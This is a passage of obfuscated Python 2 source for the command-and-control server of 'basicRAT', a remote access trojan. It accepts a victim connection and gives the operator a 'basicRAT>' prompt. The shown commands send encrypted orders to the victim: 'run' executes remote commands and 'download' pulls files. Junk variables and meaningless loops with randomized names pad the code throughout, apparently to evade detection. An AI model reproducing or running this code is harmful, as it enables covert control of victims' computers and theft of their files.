            NOysPFpIGUPemYYjlhwxSlzBpXxgqRVN = 'HgZjdxOZhcSheFbuaMYkDOaRBwRuqeqg'
            NOysPFpIGUPemYYjlhwxSlzBpXxgqRVN = MPwFIaJdrKUxXzbXQHjCNffaCNQIcaVu
        else:
            NOysPFpIGUPemYYjlhwxSlzBpXxgqRVN = 'HgZjdxOZhcSheFbuaMYkDOaRBwRuqeqg'
            NOysPFpIGUPemYYjlhwxSlzBpXxgqRVN = 'IleiyMhVKpFDHfmPlJUdWgadzxScdPyr'
        print 'Error: Unable to start server, uhFFevieeGsuCqFtwCxJWXQdoymyzkCf {} in use?'.format(uhFFevieeGsuCqFtwCxJWXQdoymyzkCf)
        sys.exit(1)
    for ZtbIvGyyFSxisRXQOjlKfiBUgMPPHFPF in DDBQOozeTzbgdlcLQpotKhCGBZFvDUPg.split('\n'):

        eCagNuhqDvrMzUKmPMDFopOITsWOZHMR = 'TSDaKdBWGqOpofJeOvYwWCKWLGXVMlvn'
        IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ = 'MYIgWEsYSATLTrzVrIEoltsROlFFDNTg'
        EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP = 'PqJxMUclTWavguEPsTHvMZvCeLjNpDdN'
        rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK = 'LWHgvaEiyzWVyFBXjnNlexEVDmoqwDNh'
        if IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ == eCagNuhqDvrMzUKmPMDFopOITsWOZHMR:
            for eCagNuhqDvrMzUKmPMDFopOITsWOZHMR in IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ:
                if IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ == IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ:
                    EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP = 'rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK'
                elif EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP == rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK:
                    rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK = eCagNuhqDvrMzUKmPMDFopOITsWOZHMR
                else:
                    eCagNuhqDvrMzUKmPMDFopOITsWOZHMR = IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ
        elif EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP == EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP:
            for EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP in IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ:
                if rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK == IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ:
                    EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP = 'rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK'
                elif EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP == rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK:
                    rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK = eCagNuhqDvrMzUKmPMDFopOITsWOZHMR
                else:
                    eCagNuhqDvrMzUKmPMDFopOITsWOZHMR = IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ
                    for EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP in IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ:
                        if rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK == IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ:
                            EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP = 'rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK'
                        elif EBQGuZbWJqDUltsgxGyDyjtQpISKWFPP == rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK:
                            rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK = eCagNuhqDvrMzUKmPMDFopOITsWOZHMR
                        else:
                            eCagNuhqDvrMzUKmPMDFopOITsWOZHMR = rJbTOGDkOeLMRjyltlgsWJJEsxUEtsoK
        else:
            eCagNuhqDvrMzUKmPMDFopOITsWOZHMR = IVJKQrMQKRItFdwDzzCizLFofgOUEOuQ
        time.sleep(0.05)
        print ZtbIvGyyFSxisRXQOjlKfiBUgMPPHFPF

        try:
            WiqqWMGTLsXBHseZhREcMCwtceCzvhih = 'mZjOfLhEvWLxdPdhTgDbmocknAsbQRlX'
            HYeTcZvIibNegwfDjwXZFYAQlXPCwZLd = 'qDGIsQnlzDqTgozhiJDerFMcNbXwEGFK'
            yUSudTZurqflnpndrNutAnRJwsfowIWo = 'yJQGMoTitCWMqcxKvEVYqCdlNKdKNZAA'
            pbDofQNfMQLpMdPjvMmhKyHxNRawPUWX = 'CvAdRAMlRREYhbuEnQCfNaobbKtuYlLK'
            dGaHvYlguvwRektUotQuYHguxkyLiHgX = 'EokZWCONMIyNuMoltVoffVvPXoKmFkek'
            JxPHjFCBbzDXzYjkKtynynAskPyxyTGH = 'lcTdYPczRHaOSuoyGYRMlCWTOzAgMQFk'
            SDrAtkzvOVLnNdmtCPiaEiGKYSuXTYGv = [
                    'mZjOfLhEvWLxdPdhTgDbmocknAsbQRlX',
                    'yJQGMoTitCWMqcxKvEVYqCdlNKdKNZAA',
                    'EokZWCONMIyNuMoltVoffVvPXoKmFkek',
                    'dLZGwmYDNEkXWuAuJvcMdhEleCCoYnQM'
            ]
            for WiqqWMGTLsXBHseZhREcMCwtceCzvhih in JxPHjFCBbzDXzYjkKtynynAskPyxyTGH:
                for HYeTcZvIibNegwfDjwXZFYAQlXPCwZLd in yUSudTZurqflnpndrNutAnRJwsfowIWo:
                    if pbDofQNfMQLpMdPjvMmhKyHxNRawPUWX == dGaHvYlguvwRektUotQuYHguxkyLiHgX:
                        HYeTcZvIibNegwfDjwXZFYAQlXPCwZLd = WiqqWMGTLsXBHseZhREcMCwtceCzvhih
                    elif dGaHvYlguvwRektUotQuYHguxkyLiHgX == HYeTcZvIibNegwfDjwXZFYAQlXPCwZLd:
                        HYeTcZvIibNegwfDjwXZFYAQlXPCwZLd = JxPHjFCBbzDXzYjkKtynynAskPyxyTGH
                    else:
                        dGaHvYlguvwRektUotQuYHguxkyLiHgX = JxPHjFCBbzDXzYjkKtynynAskPyxyTGH
                        for HYeTcZvIibNegwfDjwXZFYAQlXPCwZLd in SDrAtkzvOVLnNdmtCPiaEiGKYSuXTYGv:
                            yUSudTZurqflnpndrNutAnRJwsfowIWo = HYeTcZvIibNegwfDjwXZFYAQlXPCwZLd
        except Exception:
            pass
    print 'basicRAT server listening on uhFFevieeGsuCqFtwCxJWXQdoymyzkCf {}...'.format(uhFFevieeGsuCqFtwCxJWXQdoymyzkCf)
    bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.listen(10)
    SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ, SDpluccDohxUjwHdhdpJKNJIehhLPxVp = bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.accept()
    DETfGmKuhOglKRjePCaUWvDYeugRneWo = oNZYiYHmYKBhkOiCodDdHRZcATGFPzLg(SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ, server=True)
    while True:

        eGthDUKUNuRkqupWdqyILfFuGfoixkhH = 'aGPtzvGhdbmfjnHlyrRGaoInUtxDDFDz'
        FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX = 'DkbBagUBufVESFTFXeJEFSXbksEyZNpx'
        wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi = 'SqYRnJIhbzeSCIpBKurzCfpldUHcATTm'
        rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM = 'WZrWtiYGywpwfSScrDzkkuhZTQZcpmMd'
        if FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX == eGthDUKUNuRkqupWdqyILfFuGfoixkhH:
            for eGthDUKUNuRkqupWdqyILfFuGfoixkhH in FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX:
                if FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX == FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX:
                    wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi = 'rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM'
                elif wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi == rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM:
                    rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM = eGthDUKUNuRkqupWdqyILfFuGfoixkhH
                else:
                    eGthDUKUNuRkqupWdqyILfFuGfoixkhH = FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX
        elif wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi == wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi:
            for wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi in FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX:
                if rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM == FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX:
                    wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi = 'rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM'
                elif wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi == rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM:
                    rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM = eGthDUKUNuRkqupWdqyILfFuGfoixkhH
                else:
                    eGthDUKUNuRkqupWdqyILfFuGfoixkhH = FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX
                    for wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi in FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX:
                        if rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM == FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX:
                            wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi = 'rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM'
                        elif wIMNbbhWHwNDlVwGDyZQRGfKIYeTgaHi == rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM:
                            rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM = eGthDUKUNuRkqupWdqyILfFuGfoixkhH
                        else:
                            eGthDUKUNuRkqupWdqyILfFuGfoixkhH = rdrGDBcDfLiFUrglgeRlPlLsayWGtIDM
        else:
            eGthDUKUNuRkqupWdqyILfFuGfoixkhH = FUBwHkEHGsYDEdJRtCnfHecmtccVFRPX
        wQNfCKYIPcQfcvcpllkSUIEyjDRxrUnO = raw_input('\n[{}] basicRAT> '.format(SDpluccDohxUjwHdhdpJKNJIehhLPxVp[0])).rstrip()
        if not wQNfCKYIPcQfcvcpllkSUIEyjDRxrUnO:

            CxKIXAtrlDWIcZVafSYDPZBvfquNgOku = 'SbtduqgRloWmtgUXDfdvCehiRLiogvip'
            KBlWQNumJxzezTgJtgzvTjbNKcrxQNad = 'ODKgfvoLudLFyHzbTjPjanJtFwonGJsR'
            iXFirNhBydkNJBkHhjemvSXVujPbIUzP = 'ezjmTCoMjNCFSQCJqbOllKWsQAgAHjBX'
            if CxKIXAtrlDWIcZVafSYDPZBvfquNgOku == KBlWQNumJxzezTgJtgzvTjbNKcrxQNad:
                iXFirNhBydkNJBkHhjemvSXVujPbIUzP = 'ezjmTCoMjNCFSQCJqbOllKWsQAgAHjBX'
                iXFirNhBydkNJBkHhjemvSXVujPbIUzP = CxKIXAtrlDWIcZVafSYDPZBvfquNgOku
            else:
                iXFirNhBydkNJBkHhjemvSXVujPbIUzP = 'ezjmTCoMjNCFSQCJqbOllKWsQAgAHjBX'
                iXFirNhBydkNJBkHhjemvSXVujPbIUzP = 'SbtduqgRloWmtgUXDfdvCehiRLiogvip'
            continue

            FfhEYLaSTsLVJhSoxwJFJYOHWJzNDTBA = 'qwLiyeNXFGXKgmgyDIEqRrwZnpAXBOLF'
            mdcpfeLwNOUeVqVYOHZyOtvIBtwWgnyu = 'EpDlLcFKQsXqPZnzZOLzSzmTAjYZVULW'
            NRxsAvuZxFLpLYHyWuHjdcttqxdwrWQI = 'JoEsVQCrjugoPpYuCDFXEynUNlamESAH'
            if FfhEYLaSTsLVJhSoxwJFJYOHWJzNDTBA == mdcpfeLwNOUeVqVYOHZyOtvIBtwWgnyu:
                NRxsAvuZxFLpLYHyWuHjdcttqxdwrWQI = 'JoEsVQCrjugoPpYuCDFXEynUNlamESAH'
                NRxsAvuZxFLpLYHyWuHjdcttqxdwrWQI = FfhEYLaSTsLVJhSoxwJFJYOHWJzNDTBA
            else:
                NRxsAvuZxFLpLYHyWuHjdcttqxdwrWQI = 'JoEsVQCrjugoPpYuCDFXEynUNlamESAH'
                NRxsAvuZxFLpLYHyWuHjdcttqxdwrWQI = 'qwLiyeNXFGXKgmgyDIEqRrwZnpAXBOLF'
        gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr, _, action = wQNfCKYIPcQfcvcpllkSUIEyjDRxrUnO.partition(' ')
        if gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr not in bhZPwyVUzTxRHSlXUHZCVZXxkyAPJDnV:

            GIvtuvLLbitjyUbVGyjNbQdTeyBhdKsS = 'LAGFUPjNuKVwGHFlVkALUPwhzsgbrWIA'
            QAASOdpSXpmuwCIcwiwjRBohgchuEfpI = 'ZGQDQsQMOJktFFcPizjSEQZtiZbQLUHd'
            if GIvtuvLLbitjyUbVGyjNbQdTeyBhdKsS != QAASOdpSXpmuwCIcwiwjRBohgchuEfpI:
                GIvtuvLLbitjyUbVGyjNbQdTeyBhdKsS = 'ZGQDQsQMOJktFFcPizjSEQZtiZbQLUHd'
                QAASOdpSXpmuwCIcwiwjRBohgchuEfpI = GIvtuvLLbitjyUbVGyjNbQdTeyBhdKsS
                GIvtuvLLbitjyUbVGyjNbQdTeyBhdKsS = 'LAGFUPjNuKVwGHFlVkALUPwhzsgbrWIA'
            print 'Invalid command, type "help" to see gxOFKmPBXnkCwLBFhlRRNpoPpJfHvNBS list of commands.'

            TybCJTTeLVxEdEJfcZbOWXiYjPyKsxSP = 'VkyUXWIdVBBtaeNNxuhXRiTaTRtCRysN'
            YYyhMjhyIJSTgztODVfGABehJiuUpuam = 'XdHSTeKmruZhKZQVbTtmwjfpsfeGnekE'
            ekQFxpSGwDIRkHEQguSqCLnDhqlnJQJe = 'sRscyxPbRDJFZyjIodhWSEHOtDjxxtjD'
            AxuserUKhoEPIsLFplGDvHQuzblLGyzV = 'LgJhsewxercZKfwMlyLtghkbctjpozoZ'
            jurcKiPaYzHWEZzbnIUCSMHLXCpCpbCE = 'ZZcaBzoDWurMFTJAXkgCFdMVvPfYNndQ'
            jvCudpuPoLBMCuxgfSzrUvtuvGayMlys = 'ptGCZIoWmOmTnDJRPAFpTTDmNTVHOMnG'
            if ekQFxpSGwDIRkHEQguSqCLnDhqlnJQJe == AxuserUKhoEPIsLFplGDvHQuzblLGyzV:
                for jvCudpuPoLBMCuxgfSzrUvtuvGayMlys in jurcKiPaYzHWEZzbnIUCSMHLXCpCpbCE:
                    if jvCudpuPoLBMCuxgfSzrUvtuvGayMlys == AxuserUKhoEPIsLFplGDvHQuzblLGyzV:
                        jurcKiPaYzHWEZzbnIUCSMHLXCpCpbCE = TybCJTTeLVxEdEJfcZbOWXiYjPyKsxSP
                    else:
                        AxuserUKhoEPIsLFplGDvHQuzblLGyzV = YYyhMjhyIJSTgztODVfGABehJiuUpuam
            continue

            hUsFXbZVxHmimkoebVDhdpSshAzGtmUw = 'zFzyQqhJUvbxKvSQpgpoFjbkkbakSUrs'
            eMJwdFNDralGEOIlJTciCwecGygXvbkj = 'dcmdeMTjbWXMyNsdjdhhulMMPQSuNYun'
            if hUsFXbZVxHmimkoebVDhdpSshAzGtmUw != eMJwdFNDralGEOIlJTciCwecGygXvbkj:
                hUsFXbZVxHmimkoebVDhdpSshAzGtmUw = 'dcmdeMTjbWXMyNsdjdhhulMMPQSuNYun'
                eMJwdFNDralGEOIlJTciCwecGygXvbkj = hUsFXbZVxHmimkoebVDhdpSshAzGtmUw
                hUsFXbZVxHmimkoebVDhdpSshAzGtmUw = 'zFzyQqhJUvbxKvSQpgpoFjbkkbakSUrs'
        if gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'help':

            JInhuiTmWRYCafBfNjONRCvFvevKfPvs = 'DZBADjWuTvrtCDJbZAbHWWBemzKetrMO'
            DzDhMdYWmRVNtgIxiHhbKCeILuRWNWUy = 'rhmZDaNIHduvYKIHDMuHnOCLJePFBjdf'
            fylAXZKYlEDHXWsMcjvfAqDiZFShtCPJ = 'oLMGFNVlBAyMtihnyInhafPITtWyaXGq'
            AGVdFPqHBzSgAodcvyzHJGkmrERaAbLc = 'chbQzVfAGeUkSMSOmSlSlIcmYeQtMNiE'
            sLdTPzphmqWkOCUtVPLCWDHgOlxFKzKT = 'POAmTJFjxDPaMQXfxtiHKjQkKfTpKfVB'
            gqXCjpuUqCTxDisciMlALoSlfNNoafNb = 'HspamRPpviClVWMzQPrpKoeFqmiCTTcJ'
            if fylAXZKYlEDHXWsMcjvfAqDiZFShtCPJ == AGVdFPqHBzSgAodcvyzHJGkmrERaAbLc:
                for gqXCjpuUqCTxDisciMlALoSlfNNoafNb in sLdTPzphmqWkOCUtVPLCWDHgOlxFKzKT:
                    if gqXCjpuUqCTxDisciMlALoSlfNNoafNb == AGVdFPqHBzSgAodcvyzHJGkmrERaAbLc:
                        sLdTPzphmqWkOCUtVPLCWDHgOlxFKzKT = JInhuiTmWRYCafBfNjONRCvFvevKfPvs
                    else:
                        AGVdFPqHBzSgAodcvyzHJGkmrERaAbLc = DzDhMdYWmRVNtgIxiHhbKCeILuRWNWUy
            print etrMyKRfRoADdEjiKJAjESpKKyKsaWst

            HZPAOPlaIobtzHEZLRRBJNzThlUXyaDQ = 'OwiYTfFUnmOuwHRZHZrmYRJQqEaynHea'
            KDLHHqFXVlwOWqKBLLFQjgbPQWGQLJLo = 'xLOqdeAPgckInBQyukphqwGHeHhBzzCN'
            ZBtqXElgdbctKVAhtWUKhdZiwjcwZMJQ = 'tcJFpizNBifsJGUCwLQHwvzQIxAclgnE'
            if HZPAOPlaIobtzHEZLRRBJNzThlUXyaDQ == KDLHHqFXVlwOWqKBLLFQjgbPQWGQLJLo:
                ZBtqXElgdbctKVAhtWUKhdZiwjcwZMJQ = 'tcJFpizNBifsJGUCwLQHwvzQIxAclgnE'
                ZBtqXElgdbctKVAhtWUKhdZiwjcwZMJQ = HZPAOPlaIobtzHEZLRRBJNzThlUXyaDQ
            else:
                ZBtqXElgdbctKVAhtWUKhdZiwjcwZMJQ = 'tcJFpizNBifsJGUCwLQHwvzQIxAclgnE'
                ZBtqXElgdbctKVAhtWUKhdZiwjcwZMJQ = 'OwiYTfFUnmOuwHRZHZrmYRJQqEaynHea'
            continue

            try:
                RLGgFaDhRcLbaJauYSeCUARpdIyDrTWR = 'ClWbxXTktHzKCpPqHqHxdzFCdBRgbgdO'
                rPjjToJfnGLalsgOpdiKtNPJlfFBJNso = 'hCsHjXnosTyqjqqpeXtjTEvYTgTnxJKk'
                YFnaQSPGMwsAqrzhFbNIFTrPuucjnslL = 'uKhoEbSNMDxpzyQYkxJILvujuSptWvPv'
                AwbmlLEiGpVHzqBuDLKWSHldNDGLjJcr = 'qWLsHXezLeEXgeduMzwIjmDdpgeeOltL'
                VktkcCrRHoPRULAmoZHGLoNSmLKpOVri = 'EBjoDIeQdSBKfqbuNOhJtQguWdEDOlrS'
                wybPMXvtWVYyANLtuyZbUZxCENqpNkxe = 'HJhxXgzKlzrwYSNWtmFQYwZMMqjHfDWi'
                ikkZmQUUMNaxywqdUttNFOwlwKlQvpLq = [
                        'ClWbxXTktHzKCpPqHqHxdzFCdBRgbgdO',
                        'uKhoEbSNMDxpzyQYkxJILvujuSptWvPv',
                        'EBjoDIeQdSBKfqbuNOhJtQguWdEDOlrS',
                        'TdZjEwSMjPZHSfYVAKHhuRHpwlkdKmdt'
                ]
                for RLGgFaDhRcLbaJauYSeCUARpdIyDrTWR in wybPMXvtWVYyANLtuyZbUZxCENqpNkxe:
                    for rPjjToJfnGLalsgOpdiKtNPJlfFBJNso in YFnaQSPGMwsAqrzhFbNIFTrPuucjnslL:
                        if AwbmlLEiGpVHzqBuDLKWSHldNDGLjJcr == VktkcCrRHoPRULAmoZHGLoNSmLKpOVri:
                            rPjjToJfnGLalsgOpdiKtNPJlfFBJNso = RLGgFaDhRcLbaJauYSeCUARpdIyDrTWR
                        elif VktkcCrRHoPRULAmoZHGLoNSmLKpOVri == rPjjToJfnGLalsgOpdiKtNPJlfFBJNso:
                            rPjjToJfnGLalsgOpdiKtNPJlfFBJNso = wybPMXvtWVYyANLtuyZbUZxCENqpNkxe
                        else:
                            VktkcCrRHoPRULAmoZHGLoNSmLKpOVri = wybPMXvtWVYyANLtuyZbUZxCENqpNkxe
                            for rPjjToJfnGLalsgOpdiKtNPJlfFBJNso in ikkZmQUUMNaxywqdUttNFOwlwKlQvpLq:
                                YFnaQSPGMwsAqrzhFbNIFTrPuucjnslL = rPjjToJfnGLalsgOpdiKtNPJlfFBJNso
            except Exception:
                pass
        SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ.send(PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib(wQNfCKYIPcQfcvcpllkSUIEyjDRxrUnO, DETfGmKuhOglKRjePCaUWvDYeugRneWo))
        if gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'quit':

            ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu = 'xDlQbZpAFMmjqJoyVrmhxjghPMMmrRiq'
            VFsyfzSQqwJvXFVTzWKFFIscxQhfAOcI = 'OAcaUUydVTIoLqnIXDWVyIhkPnhjSXOd'
            PtKYqfAGEqyNvsJQByJXazghlnEMnEJS = 'laevuEjiMPzApaUfXTCQyotOPcbEEFQe'
            PrkezRHVulVVzxIPTaBlAiSwYmvLGuob = 'rrAPGoGTrgEhllOcQMMPtOLvTDPzZYnW'
            xVEkBcZFizvrSZILKRjZbsMllNZLkGKv = 'pGNfSQRxabeoVQRiHDDBfEUKolYEuFrG'
            waLFAhOADCEMTFMUNchLvdfcBOxqVjGB = 'rqpiWIEIjAIpWInZKGPjaDQmYsoGkCkO'
            if ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu != PrkezRHVulVVzxIPTaBlAiSwYmvLGuob:
                VFsyfzSQqwJvXFVTzWKFFIscxQhfAOcI = PtKYqfAGEqyNvsJQByJXazghlnEMnEJS
                for waLFAhOADCEMTFMUNchLvdfcBOxqVjGB in PrkezRHVulVVzxIPTaBlAiSwYmvLGuob:
                    if waLFAhOADCEMTFMUNchLvdfcBOxqVjGB != PtKYqfAGEqyNvsJQByJXazghlnEMnEJS:
                        VFsyfzSQqwJvXFVTzWKFFIscxQhfAOcI = VFsyfzSQqwJvXFVTzWKFFIscxQhfAOcI
                    else:
                        xVEkBcZFizvrSZILKRjZbsMllNZLkGKv = ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu
            else:
                PtKYqfAGEqyNvsJQByJXazghlnEMnEJS = ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu
                ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu = xVEkBcZFizvrSZILKRjZbsMllNZLkGKv
                if PtKYqfAGEqyNvsJQByJXazghlnEMnEJS == ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu:
                    for waLFAhOADCEMTFMUNchLvdfcBOxqVjGB in ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu:
                        if waLFAhOADCEMTFMUNchLvdfcBOxqVjGB == PtKYqfAGEqyNvsJQByJXazghlnEMnEJS:
                            PtKYqfAGEqyNvsJQByJXazghlnEMnEJS = ZUCEAIOaasNQwCYeqnrzDGMhkGWWAHKu
                        else:
                            PtKYqfAGEqyNvsJQByJXazghlnEMnEJS = xVEkBcZFizvrSZILKRjZbsMllNZLkGKv
            bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.close()
            sys.exit(0)
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'run':

            try:
                pPEMnnNxFYPkePQdyPkhIqCJnmbwtIXF = 'QwyPZSakNNwajAbWKTYufHBIVXAERzIa'
                tsnQDSYVYNLtWXTlPdEmeeDdGtLQvohg = 'MYSMYlxdQtkDqGifRwCKjRTERnzwFFAi'
                xnJCNECCyBPfdQdVtBQSoomjjDrMxNtN = 'HDRiRusYBqQjEUodFogBICsdnKiztgCG'
                ZzoHGfxnmyAuZrscilWGagvZujCBCJlv = 'LqzHGcHDLtlueEAfgbLMpbjmUZnurSpH'
                UHAKUGKAtCkLSQAlxzcppyCrFCPpipkN = 'dHKqJEClDlxDmUKPVhFhsYmJEfnBYpuE'
                HShnZykJUHPxuUaQUrDRrLThldytGnkD = 'hzaPIXhKBSDAtLCLZvmKKpCieGOAgSzc'
                TcFUNohmOgZqzHiFszLcNYcVDHAaDbym = [
                        'QwyPZSakNNwajAbWKTYufHBIVXAERzIa',
                        'HDRiRusYBqQjEUodFogBICsdnKiztgCG',
                        'dHKqJEClDlxDmUKPVhFhsYmJEfnBYpuE',
                        'VieTurhGPWQLVQmYrwAmOluuGTsoVccc'
                ]
                for pPEMnnNxFYPkePQdyPkhIqCJnmbwtIXF in HShnZykJUHPxuUaQUrDRrLThldytGnkD:
                    for tsnQDSYVYNLtWXTlPdEmeeDdGtLQvohg in xnJCNECCyBPfdQdVtBQSoomjjDrMxNtN:
                        if ZzoHGfxnmyAuZrscilWGagvZujCBCJlv == UHAKUGKAtCkLSQAlxzcppyCrFCPpipkN:
                            tsnQDSYVYNLtWXTlPdEmeeDdGtLQvohg = pPEMnnNxFYPkePQdyPkhIqCJnmbwtIXF
                        elif UHAKUGKAtCkLSQAlxzcppyCrFCPpipkN == tsnQDSYVYNLtWXTlPdEmeeDdGtLQvohg:
                            tsnQDSYVYNLtWXTlPdEmeeDdGtLQvohg = HShnZykJUHPxuUaQUrDRrLThldytGnkD
                        else:
                            UHAKUGKAtCkLSQAlxzcppyCrFCPpipkN = HShnZykJUHPxuUaQUrDRrLThldytGnkD
                            for tsnQDSYVYNLtWXTlPdEmeeDdGtLQvohg in TcFUNohmOgZqzHiFszLcNYcVDHAaDbym:
                                xnJCNECCyBPfdQdVtBQSoomjjDrMxNtN = tsnQDSYVYNLtWXTlPdEmeeDdGtLQvohg
            except Exception:
                pass
            lgzZAqxVTrwKsvFBJOyhVuXfeqVrYfBp = SMHguCfEalCtPGlEHmPRMuUIIuhjKlQZ.recv(4096)
            print VZGbVmtqTmDOEQHhKIeKvmdxXyGUEXLA(lgzZAqxVTrwKsvFBJOyhVuXfeqVrYfBp, DETfGmKuhOglKRjePCaUWvDYeugRneWo).rstrip()
        elif gqdrIXLOXPHbkxsnMpnqAYePclhNxzZr == 'download':

            JScfRNWOViXKmKZRLabbQaRffVBZjujd = 'PFfNErfUVSvAgHXPDtttvGkuCNrvsAoG'
            sKMKyiwfrOwXmNXPBEAntFVfvAqNXEvx = 'SyvZZFrlmRXTjlemRhHycXrcFtrtcuNe'
            FfZcZlAgOToYgXojbwRZdUupWewknBqO = 'AkdAHbbjjjYiGsUoRqKCRPbejdmQlUMe'
            QMesjUFgaLSxZUiobeAPwPVdAtaXivus = 'RLABiGEkosSfocSekGqqANSvtjwJsTIJ'
            KQQwoAdmbUMUqPCgPmghyGCPLmpSbAFy = 'gDzZDhZmfHXzmUFaaedGnMcHCSpAddtz'
            QwNUNerIIUyxLeZUdzRozvNqQQPxlRnB = 'HCKIxsWUlRuEoXRcfEnMaJyHkcveKGGY'
            if FfZcZlAgOToYgXojbwRZdUupWewknBqO == QMesjUFgaLSxZUiobeAPwPVdAtaXivus:
                for QwNUNerIIUyxLeZUdzRozvNqQQPxlRnB in KQQwoAdmbUMUqPCgPmghyGCPLmpSbAFy:
                    if QwNUNerIIUyxLeZUdzRozvNqQQPxlRnB == QMesjUFgaLSxZUiobeAPwPVdAtaXivus:
                        KQQwoAdmbUMUqPCgPmghyGCPLmpSbAFy = JScfRNWOViXKmKZRLabbQaRffVBZjujd
                    else:
                        QMesjUFgaLSxZUiobeAPwPVdAtaXivus = sKMKyiwfrOwXmNXPBEAntFVfvAqNXEvx
            for WUetfBAbhvHorsheRaCajunshIBsTtEY in action.split():

                iDPUEgDcdNiURqepzBDclXffvNVGxjFK = 'LOXgMZCDihyFphiyUHyRUKUmNGeyrWqB'
                ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB = 'alvHTISjjPbuNrUHxibibJRWSACffDKT'
                kVgXyvfMhbzvUHsMHTjgkHSZeeumYhkk = 'vzThGOAzrwwINbSeoIPpudlNAfWdWtce'
                zoDGEVEFtMxiQoKCnNrtTAEEqVWGsbNd = 'KvekRxQyNhucEjSGWXvkODzopNYacsxZ'
                ysSeLddjAtqVUlxhNCALuCnucwIvjhJA = 'QzzIhaggGoXrEHfNLfyAoXZQbUvBEFhE'
                if iDPUEgDcdNiURqepzBDclXffvNVGxjFK in ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB:
                    iDPUEgDcdNiURqepzBDclXffvNVGxjFK = ysSeLddjAtqVUlxhNCALuCnucwIvjhJA
                    if ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB in kVgXyvfMhbzvUHsMHTjgkHSZeeumYhkk:
                        ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB = zoDGEVEFtMxiQoKCnNrtTAEEqVWGsbNd
                elif ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB in iDPUEgDcdNiURqepzBDclXffvNVGxjFK:
                    kVgXyvfMhbzvUHsMHTjgkHSZeeumYhkk = ylWRXfEfWeEOafOyUxxyyVFKvyWkGfJB
